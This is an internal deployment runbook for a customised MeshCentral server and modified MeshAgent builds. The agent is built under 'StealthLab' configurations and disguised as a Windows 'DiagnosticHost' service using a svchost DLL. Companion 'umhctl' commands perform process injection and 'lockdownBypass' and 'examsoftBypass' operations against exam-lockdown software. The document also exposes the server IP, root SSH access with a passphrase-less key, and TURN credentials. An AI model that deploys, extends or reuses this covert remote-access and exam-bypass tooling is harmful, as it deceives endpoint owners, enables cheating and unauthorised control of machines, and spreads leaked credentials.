# Deployment — Single Source of Truth

> Authoritative reference for deploying MeshAgent binaries AND MeshCentral server code to the production server.

Related operational SSOT:

- `docs/REPO_SYNC_AND_DEPLOYMENT_PLAN.md` for cross-repo keep-set, sync hygiene, branch policy, and combined release order across `MeshAgent`, `MeshCentral`, and `UserModeHook`.
- `docs/UMH_CONTROL_SISTER_REPO_SSOT.md` for the agent-side `umhctl` contract and sister-repo update rules.
- `docs/UMH_CONTROL_DEPLOYMENT_LEDGER.md` for the current MeshAgent-side UMH deployment assumptions and recorded cross-repo drift.

Migration note (2026-04-19):
- operator-designated replacement VPS IP is `74.208.52.191`
- direct SSH to `74.208.52.191:22` timed out from the workstation during this update, so any infrastructure facts not explicitly re-captured below remain the last verified pre-migration values
- update the local `meshcentral` SSH alias or override `MESHCENTRAL_SERVER`/`MESHCENTRAL_SSH_HOST` before using `deploy.py` without explicit host overrides

## Server Infrastructure

| Property | Value |
|---|---|
| **Host** | `74.208.52.191` (hostname pending SSH revalidation after the VPS move) |
| **DNS** | `high.support` / `agents.high.support` / `relay.high.support` |
| **OS** | Ubuntu 24.04, Linux 6.8.0-90-generic x86_64 |
| **SSH User** | `root` |
| **SSH Key** | `~/.ssh/id_ed25519` (comment: `meshagent-deploy@workstation`) |
| **Service** | `systemctl {start|stop|restart|status} meshcentral` |
| **Node** | `/usr/bin/node` |
| **MeshCentral Base** | `/opt/meshcentral` |
| **MongoDB** | `mongodb://127.0.0.1:27017/meshcentral` |

## Remote Directory Layout

```
/opt/meshcentral/
├── meshcentral-data/
│   ├── config.json                          # MeshCentral server config
│   └── signedagents/                        # Agent binaries served to endpoints
│       ├── MeshService.exe                  # x86 32-bit agent
│       ├── MeshService64.exe                # x86 64-bit agent  ← PRIMARY DEPLOY TARGET
│       ├── MeshServiceARM64.exe             # ARM64 agent
│       ├── MeshCmd.exe / MeshCmd64.exe      # Command-line tools
│       └── hashagents.json                  # Signed-agent metadata (auto-generated)
├── node_modules/meshcentral/agents/         # Module-level agent copies
│   ├── MeshService64.exe                    # ← Authoritative source build for MeshCentral startup
│   ├── hashagents.js                        # Architecture ID mapping source
│   ├── hashagents.json                      # Authoritative runtime manifest read by MeshCentral
│   └── ...                                  # Other tools (Router, Commander, etc.)
├── staging/                                 # Pre-deploy staging area (created by deploy.py)
└── backups/                                 # Timestamped backup snapshots
    └── YYYYMMDD_HHMMSS/
        ├── signedagents/
        └── agents/
```

## Local Build Artifacts

| Artifact | Local Path (relative to repo root) | Renamed To (on server) |
|---|---|---|
| Standalone EXE x64 | `meshservice/x64/StealthLab/MeshService-2022.exe` | **`MeshService64.exe`** |
| Standalone EXE x86 | `meshservice/StealthLab/MeshService-2022.exe` | `MeshService.exe` |
| Svchost DLL publish sidecar | `meshservice/x64/StealthLab_DLL/MeshService-2022.dll` | `MeshService64.dll` |
| Runtime svchost DLL | `meshservice/x64/StealthLab_DLL/MeshService-2022.dll` | `diagsvc.dll` |
| Embedded Payload | `meshservice/embedded/svchost_payload.dll` | `svchost_payload.dll` |
| Agent policy x64 | `meshservice/x64/StealthLab/MeshService-2022.msh` | `MeshService64.msh` |
| Agent policy x86 | `meshservice/StealthLab/MeshService-2022.msh` | `MeshService.msh` |
| Shared provisioning policy | `WinDiagnosticHost.msh` | `WinDiagnosticHost.msh` |
| UMH public payload | `../UserModeHook/build/bin/Release/MasterService.exe` | `MasterService.exe` |

**Important:** The Visual Studio build output is named `MeshService-2022.exe`. During staging/deploy it is **renamed** to `MeshService64.exe` to match the filename MeshCentral expects when serving agents to endpoints.

## hashagents.json

After deploying new binaries, `hashagents.json` must be regenerated from the actual published bytes. MeshCentral reads `node_modules/meshcentral/agents/hashagents.json` at startup, then resolves runtime binaries in this order: `meshcentral-data/agents/` first, `meshcentral-data/signedagents/` second, and `node_modules/meshcentral/agents/` last. The signed-agent manifest is maintained for observability and post-restart verification, but the module-side manifest is the authoritative startup input. Each entry contains:

```json
{
  "4": {
    "filename": "MeshService64.exe",
    "hash": "<SHA384 of the binary>",
    "size": 7720960,
    "mtime": "2026-03-02T17:56:54Z"
  }
}
```

| Field | Description |
|---|---|
| **Key** (`"4"`) | MeshCentral agent architecture ID (`4` = Windows Service x64) |
| `filename` | Must match the renamed binary on disk (`MeshService64.exe`) |
| `hash` | SHA-384 hash of the binary — MeshCentral uses this to detect changes and serve updates |
| `size` | File size in bytes |
| `mtime` | ISO 8601 UTC timestamp of when the binary was last modified |

**Regeneration:** `deploy.py deploy` does not execute `node hashagents.js`. That file is only the filename-to-architecture mapping source. The deploy tool parses it locally and regenerates `hashagents.json` remotely with Python so the manifest is built from the real on-disk binaries in each target directory.

**Architecture IDs relevant to this project:**

| ID | Agent |
|---|---|
| `3` | `MeshService.exe` (Windows Service x86 32-bit) |
| `4` | `MeshService64.exe` (Windows Service x86 64-bit) — **primary deploy target** |
| `5` | `meshagent_x86` (Linux x86 32-bit) |
| `6` | `meshagent_x86-64` (Linux x86 64-bit) |

## Access Methods

### 1. deploy.py (Automated — Primary)

The deployment tool at repo root (`deploy.py`) handles the full lifecycle via SSH key auth.

```bash
python deploy.py status          # Server health, agents, backups
python deploy.py stage           # Upload artifacts to /opt/meshcentral/staging/
python deploy.py deploy          # Backup → deploy → rehash → restart
python deploy.py deploy -y       # Same, skip confirmation
python deploy.py rollback        # Restore from backup
python deploy.py rollback -i 0   # Restore specific backup index
python deploy.py config          # View config.json
python deploy.py config edit     # Download, edit locally, upload, restart
python deploy.py logs 100        # Tail last N lines of service logs
python deploy.py health          # Full health check (ports, service, DB)
python deploy.py ssh "command"   # Run arbitrary remote command
```

**Deploy pipeline steps (what `deploy` does):**
1. Verifies the full local package set is present before staging
2. Creates timestamped backups of the current `meshcentral-data/agents`, `meshcentral-data/signedagents`, and `node_modules/meshcentral/agents` payloads
3. Copies the staged package set → `/opt/meshcentral/meshcentral-data/agents/`
4. Mirrors the staged package set → `/opt/meshcentral/meshcentral-data/signedagents/`
5. Mirrors the staged package set → `/opt/meshcentral/node_modules/meshcentral/agents/`
6. Copies `MasterService.exe` → `/opt/meshcentral/meshcentral-files/domain/user-hsadmin/Public/` (for `umhctl install --url ...` download only)
7. Regenerates `hashagents.json` for the module and signed publish directories from the actual remote files
8. Restarts `meshcentral` systemd service
9. Re-runs post-restart publish verification so `meshcentral-data/agents/` and `node_modules/meshcentral/agents/` still match the local build while `signedagents/` remains self-consistent if MeshCentral repacks/signs the EXEs
10. Writes local release manifest with repo SHAs + artifact hashes under `docs/testing/artifacts/`
11. Cleans staging area

### 2. Direct SSH (Ad-Hoc)

```bash
ssh -i ~/.ssh/id_ed25519 root@74.208.52.191
```

Passwordless key auth is configured. No password needed.

### 3. WinSCP (GUI — Ad-Hoc)

- Installed at: `C:\Users\Public\Desktop\WinSCP.lnk`
- Use for manual file browsing, quick edits, and drag-drop uploads
- Connect with: Host `74.208.52.191`, User `root`, Key file `C:\Users\Workstation\.ssh\id_ed25519`

### 4. SCP (Single-File Transfer)

```bash
# Upload
scp -i ~/.ssh/id_ed25519 localfile.exe root@74.208.52.191:/opt/meshcentral/staging/

# Download
scp -i ~/.ssh/id_ed25519 root@74.208.52.191:/opt/meshcentral/meshcentral-data/config.json ./config.json
```

## Deployment Workflow

### Standard Deploy (Build → Stage → Deploy)

```
1. Build with `MSBuild.exe .\MeshAgent.Build.proj /m /nologo /verbosity:minimal`
2. python deploy.py stage      → uploads to server staging/
3. python deploy.py deploy     → backup, copy, rehash, restart
4. python deploy.py health     → verify service, ports, no errors
```

Build contract:
- `MeshAgent.Build.proj` is the supported entrypoint because it serializes `StealthLab_DLL|x64` before `StealthLab|x64` and `StealthLab|Win32`.
- Direct `StealthLab|x64` project builds now force the `StealthLab_DLL|x64` prerequisite before the EXE build refreshes `meshservice/embedded/svchost_payload.dll`.
- Do not run separate x64 DLL and x64 EXE project builds in parallel against the same tree; use `MeshAgent.Build.proj` for full package output.
- Do not add or use PowerShell build wrappers. Build orchestration lives in MSBuild; Python generators are invoked only through MSBuild targets or explicit pre-build validation.
- Generated Visual Studio output directories (`meshservice/x64`, `meshservice/Win32`, `meshservice/MeshService-2022/x64`, root `x64`, and embedded svchost payload outputs) are excluded from implementation truth and should not be committed.

Publish contract for MeshAgent packages:
- `deploy.py stage` must prove the full package set is present before upload: `MeshService64.exe`, `MeshService.exe`, `MeshService64.dll`, `svchost_payload.dll`, `diagsvc.dll`, `MeshService64.msh`, `MeshService.msh`, and `WinDiagnosticHost.msh`.
- `deploy.py stage` must prove local payload parity before upload: the repo `MeshService64.dll`, `meshservice/embedded/svchost_payload.dll`, and the embedded svchost RCDATA payload inside `MeshService64.exe` must all hash-identically.
- After `deploy.py deploy`, verify the embedded svchost payload inside the remote `meshcentral-data/agents/MeshService64.exe`, `node_modules/meshcentral/agents/MeshService64.exe`, and `meshcentral-data/signedagents/MeshService64.exe`.
- A `signedagents` EXE may have a different raw file size or digest than the local EXE because MeshCentral repacks it, but its embedded svchost payload must still match the repo DLL exactly.
- When validating live package identity, distinguish the generic agent URL from a real group download. `https://high.support/meshagents?id=4` is the generic Windows x64 service package and will not prove group-specific identity. Use the portal-generated Office download link or `https://high.support/meshagents?id=4&meshid=<group-meshid>` when checking `-name`, embedded `.msh` identity, or install behavior for a specific group.
- Remote update activation in `deploy.py` derives the default Windows install root, installed `ServiceDll`, and `state\rundll32-lifecycle` directory from the active branding configuration instead of a hard-coded product path. For the current DiagnosticHost build, `branding_config.local.json` resolves those paths to `C:\ProgramData\DiagnosticHost`, `C:\ProgramData\DiagnosticHost\diagsvc.dll`, and `C:\ProgramData\DiagnosticHost\state\rundll32-lifecycle`; `MESHCENTRAL_INSTALL_ROOT`, `MESHCENTRAL_LIFECYCLE_DLL`, and `MESHCENTRAL_LIFECYCLE_STATE_DIR` remain explicit operator overrides.

### Emergency Rollback

```
1. python deploy.py rollback   → lists backups, select one, restore, restart
2. python deploy.py health     → verify recovery
```

### Config Change

```
1. python deploy.py config edit   → downloads, opens in editor, validates JSON, uploads
   (OR use WinSCP to browse and edit config.json directly)
2. Service restarts automatically if you confirm
```

---

## Part 1b: MasterService (UserModeHook) Deployment

MasterService.exe is published for UMH operator workflows, but it is not part of the MeshAgent package shape and it is not staged beside MeshAgent binaries for install/update/uninstall.

Operator-surface authority note:

- this section documents the MeshAgent-side `umhctl` operator layer
- it does not claim that the native `UserModeHook` CLI exposes identical text commands
- `docs/UMH_CONTROL_SISTER_REPO_SSOT.md` is authoritative for the split between the MeshAgent operator layer, MeshCentral UI emitters, and the native `UserModeHook` surface
- the current operator-layer default header version in this repo is `2026-03-05`, which now matches the current `UserModeHook` hard-fail version recorded in `docs/UMH_CONTROL_DEPLOYMENT_LEDGER.md`

### How It Works

1. `deploy.py stage` uploads `MasterService.exe` (from `../UserModeHook/build/bin/Release/`) to the server staging area
2. `deploy.py deploy` publishes it to the public userfiles directory
3. Agents download it on-demand via `umhctl install --url ...`
4. Native MeshAgent `-fullinstall`, `-fullupdate`, `-fulluninstall`, GUI install/update, and server auto-update do not stage or manage `MasterService.exe`
5. Native MeshAgent provisioning stays dynamic: identity and endpoint values come from the downloaded package's sibling `.msh`, embedded `.msh`, or valid staged config, not from hardcoded mesh/group values
6. Native lifecycle waits for SCM service-name release before reinstalling; `ERROR_SERVICE_MARKED_FOR_DELETE` is treated as a transient busy state, not a successful uninstall
7. Native `start` and `restart` service-control commands recover the managed service back to `AUTO_START` before retrying if the start type was found disabled unexpectedly

### Agent Console Commands (`umhctl`)

The MeshAgent shared operator module `modules/umhctl.js` is consumed by `modules/RecoveryCore.js` and mirrored into the MeshCentral-served default, minified-default, agent-recovery, tiny, and live-override core paths. The retained `umhctl` command surface for managing MasterService is:

| Command | Description |
|---|---|
| `umhctl install` | Downloads `MasterService.exe` from server and installs service |
| `umhctl install --url <url>` | Downloads from a custom URL instead of server |
| `umhctl uninstall` | Stops and uninstalls `AdvancedHookService` |
| `umhctl status` | Sends `{"op":"status"}` to UMH control pipe |
| `umhctl status --service` | Runs `MasterService.exe --status --output json` through the approved `rundll32.exe <ServiceDll>,MeshUmhHostW <manifest>` contract |
| `umhctl listProcesses` | Sends `{"op":"listProcesses"}` to control pipe |
| `umhctl getFlowContract` / `getCapabilities` | Sends control-contract and capability queries to the control pipe |
| `umhctl getPolicy` / `getConfig` | Sends read-only policy/config queries to the control pipe |
| `umhctl uiSnapshot [--pid <pid>]` | Aggregates the retained read-only UMH snapshot sections |
| `umhctl profileProcess --pid <pid>` | Sends `{"op":"profileProcess"}` to the control pipe |
| `umhctl methodPolicy [--pid <pid>]` | Sends `{"op":"methodPolicy"}` to the control pipe |
| `umhctl safetyState` | Sends `{"op":"safetyState"}` to the control pipe |
| `umhctl hookProfile --target <tag> [--exe <path>]` | Sends `{"op":"hookProfile"}` to the control pipe |
| `umhctl securityBoundary [--pid <pid>] [--target <tag>]` | Sends `{"op":"securityBoundary"}` to the control pipe |
| `umhctl inject --pid <pid> [--method <m>] [--technique <t>]` | Sends inject request to control pipe |
| `umhctl injectAll` | Sends `{"op":"injectAll"}` to control pipe |
| `umhctl telemetry` | Sends `{"op":"telemetry"}` to control pipe |
| `umhctl repair` | Sends `{"op":"repair"}` to control pipe |
| `umhctl injectTargetSet --pids <csv> [--run-id <id>] [--target-tag <tag>] [--method-key <key>]` | Sets the active target scope in the control pipe |
| `umhctl clearTargetScope` | Clears the active target scope |
| `umhctl setPolicy` / `setConfig` | Sends the retained write-policy/config operations to the control pipe |
| `umhctl lockdownBypass` / `examsoftBypass` | Sends bypass operations to control pipe |
| `umhctl ipcBypass` | Sends IPC bypass operations to the control pipe |
| `umhctl --json "<json>"` | Sends raw JSON request directly to control pipe |
| `umhctl help` | Lists commands and runtime paths |

**Download URL**: `https://<server>/userfiles/hsadmin/MasterService.exe?download=1` (auto-derived from agent's server connection; server `Public/` storage is exposed without the `Public` path segment).

**Binary location**: Determined by the UMH installer/operator flow. It is not a MeshAgent package sidecar and must not be appended next to the downloaded agent binary.

**Control pipe**: `\\.\pipe\{95c1a2e0-f84e-4c8a-9c32}-control`

Current `uiSnapshot` semantics:

- without `--pid`, it requests `status`, `flow_contract`, `capabilities`, `processes`, `policy`, `config`, and `safety_state`
- with `--pid <pid>`, it additionally requests `process_profile`, `method_policy`, and `security_boundary`
- `partial=true` means one or more section requests failed
- the current expected live partial on a healthy canary is missing `C:\ProgramData\UserModeHook\config.json`, which makes native `getConfig` return `config not found`

Runtime compatibility notes for the shared operator module:

- guard timer handles that do not implement `.unref()`
- attach child-process completion defensively when only one of `exit` or `close` is supported
- do not prepend the executable basename to `execFile` argv arrays

Current live publication reference (2026-04-14):

- published payload path: `/opt/meshcentral/meshcentral-files/domain/user-hsadmin/Public/MasterService.exe`
- published payload URL: `https://high.support/userfiles/hsadmin/MasterService.exe?download=1`
- live UI override path: `/opt/meshcentral/meshcentral-web/public/scripts/custom.js`
- live MeshCentral publication currently exposes `umhctl` across the default, minified default, recovery, diagnostic, tiny, and `meshcentral-data` default core paths
- see `docs/UMH_CONTROL_DEPLOYMENT_LEDGER.md` and the UserModeHook sister ledger for the current live hashes

### MeshCentral UI Buttons

The `custom.js` script (deployed to MeshCentral) adds preset buttons to the Run Commands dialog:

- **UMH Install** — sends `umhctl install` as agent console command (type 4)
- **UMH Status** — sends `umhctl status`
- **UMH Uninstall** — sends `umhctl uninstall`
- **UMH Help** — sends `umhctl help`

The curated live UI subset also exposes retained query/mutation buttons for:

- `listProcesses`
- `getFlowContract`
- `getCapabilities`
- `safetyState`
- `profileProcess`
- `methodPolicy`
- `securityBoundary`
- `inject`
- `injectAll`
- `clearTargetScope`
- `lockdownBypass`
- `examsoftBypass`
- `ipcBypass`

These replace the previous 62+ PowerShell download-and-run buttons with simple agent console commands.

### Deploy Workflow

```
1. Build MasterService in VS (from UserModeHook repo)
2. python deploy.py stage           → uploads MasterService.exe and MeshAgent artifacts to staging
3. python deploy.py deploy          → deploys MeshAgent to agent publish dirs and MasterService.exe to userfiles/
4. realign/update the local `MeshCentral` live mirror before changing any UMH UI surface
5. record the same change in the MeshCentral and UserModeHook sister ledgers
6. test the deployed path from the agent console with `umhctl install`
```

---

## Part 2: MeshCentral Server Code Deployment

### Overview

MeshCentral v1.1.56 is installed via npm at `/opt/meshcentral/node_modules/meshcentral/`.
As of the 2026-04-13 realignment, the local `MeshCentral` repo is treated as a mirror of the live VPS module tree plus selected live overrides, not as an authoritative source checkout with guaranteed local-only deployment tooling.

### MeshCentral Local Repo

The MeshCentral repo at `C:\Users\Workstation\Documents\GitHub\MeshCentral` is now a live mirror workspace for the deployed VPS state. See:

- `C:\Users\Workstation\Documents\GitHub\MeshCentral\docs\UMH_CONTROL_SISTER_REPO_SSOT.md`
- `C:\Users\Workstation\Documents\GitHub\MeshCentral\docs\UMH_CONTROL_DEPLOYMENT_LEDGER.md`

### Tracked File Mapping

| Local Path (in MeshCentral repo) | Remote Path on Server |
|---|---|
| `public/scripts/custom.js` | `/opt/meshcentral/meshcentral-web/public/scripts/custom.js` |
| `views/default3.handlebars` | `/opt/meshcentral/node_modules/meshcentral/views/default3.handlebars` |
| `views/agentinvite.handlebars` | `/opt/meshcentral/node_modules/meshcentral/views/agentinvite.handlebars` |
| `meshdevicefile.js` | `/opt/meshcentral/node_modules/meshcentral/meshdevicefile.js` |
| `meshagent.js` | `/opt/meshcentral/node_modules/meshcentral/meshagent.js` |
| `meshcentral-data/config.json` | `/opt/meshcentral/meshcentral-data/config.json` |

To track a new file: add an entry to `FILE_MAP` in `deploy-server.py`, then `deploy-server.py pull`.

### deploy-server.py Commands

Run from `C:\Users\Workstation\Documents\GitHub\MeshCentral`:

```bash
python deploy-server.py status               # Server version, service, tracked files
python deploy-server.py pull                  # Pull all tracked files from server to local
python deploy-server.py diff                  # Compare local vs server (hash + unified diff)
python deploy-server.py push                  # Push all changed files (backup + restart)
python deploy-server.py push --file <key>     # Push specific file only
python deploy-server.py push --dry-run        # Preview what would be pushed
python deploy-server.py update                # npm update meshcentral (backup + reapply customizations)
python deploy-server.py rollback              # Restore from server-backups/
python deploy-server.py config                # View config.json
python deploy-server.py config edit           # Edit config locally then push
python deploy-server.py logs 100              # Tail service journal
python deploy-server.py health                # Full health check
python deploy-server.py ssh "command"         # Run arbitrary remote command
python deploy-server.py vscode                # Open VS Code Remote-SSH to /opt/meshcentral
```

### Server Code Workflows

**Edit a view or module:**
```
1. python deploy-server.py pull           # Get latest from server
2. Edit files in meshcentral-server/      # Make changes locally (or in VS Code)
3. python deploy-server.py diff           # Review changes
4. python deploy-server.py push           # Backup, push, restart
5. python deploy-server.py health         # Verify
```

**npm update MeshCentral:**
```
1. python deploy-server.py update         # Backs up, stops, npm update, reapplies customizations, starts
2. python deploy-server.py health         # Verify
3. python deploy-server.py pull           # Pull any new stock files you may want to track
```

**Edit directly on server via VS Code:**
```
1. python deploy-server.py vscode         # Opens VS Code Remote-SSH to /opt/meshcentral
2. Edit files directly on server
3. Restart: ssh meshcentral "systemctl restart meshcentral"
4. python deploy-server.py pull           # Sync changes back to local working copy
```

### Server Backups (Code)

- Stored at `/opt/meshcentral/server-backups/YYYYMMDD_HHMMSS/`
- Created automatically before every `push` and `update`
- npm update backups prefixed with `npm-update-`
- Config edits create timestamped `.bak` files alongside `config.json`

### VS Code Remote-SSH

- Extension installed: `ms-vscode-remote.remote-ssh`
- SSH config alias `meshcentral` in `~/.ssh/config`
- Launch: `python deploy-server.py vscode` or `code --remote ssh-remote+meshcentral /opt/meshcentral`
- Edit server files directly with full IntelliSense, terminal, and git

### GitHub CLI

| Location | Account | Status |
|---|---|---|
| **Local (Windows)** | `hira-edu` | Authenticated via `gh auth login --web` |
| **Server (Linux)** | `hira-edu` | Authenticated, git credential helper configured |

Git protocol: HTTPS on both. Credential helper: `gh auth git-credential`.

## Key Server Configuration Notes

From `config.json`:

| Setting | Value | Purpose |
|---|---|---|
| `ignoreAgentHashCheck` | `true` | Allows custom-signed agents |
| `agentSkipServerSign` | `true` | Skips server-side agent signing |
| `noAgentUpdate` | `true` | Prevents auto-update of agents from upstream |
| `agentSignLock` | `true` | Locks agent signing |
| `agentPort` | `4445` | Agent connection port |
| `relayPort` | `4446` | Relay/fallback port |
| `port` | `4430` | Web UI port (aliased to 443) |
| `agentPing/Pong` | `60s` | Keepalive interval |
| `agentIdleTimeout` | `180s` | Idle disconnect timeout |
| `servicename` | `WinDiagnosticHost` | Custom agent service name |
| `filename` | `diaghost` | Custom agent binary name |

## Backup and Recovery

- Backups are stored at `/opt/meshcentral/backups/YYYYMMDD_HHMMSS/`
- Each backup contains copies from both `signedagents/` and `agents/`
- Automatic backups created before every deploy
- Server-side auto-backup of full MeshCentral data runs every 24h to `/var/meshcentral-backups/` (14-day retention)

## Health Check Targets

The `health` command validates:
- `meshcentral` systemd service is `active`
- Ports 4430, 4445, 4446 are listening
- Node process is running
- MongoDB is reachable
- Disk usage is healthy
- No recent error-level journal entries

## Security Notes

- SSH key (`id_ed25519`) has no passphrase — protect the workstation
- Server password auth remains enabled as fallback (password in `linux server connection details.txt`)
- `dbEncryptKey` and `dbRecordsEncryptKey` are configured in config.json
- Let's Encrypt TLS is active for `high.support` domains
- TURN server credentials are in config.json (`meshturn` / `VeryStrongPassword!`)

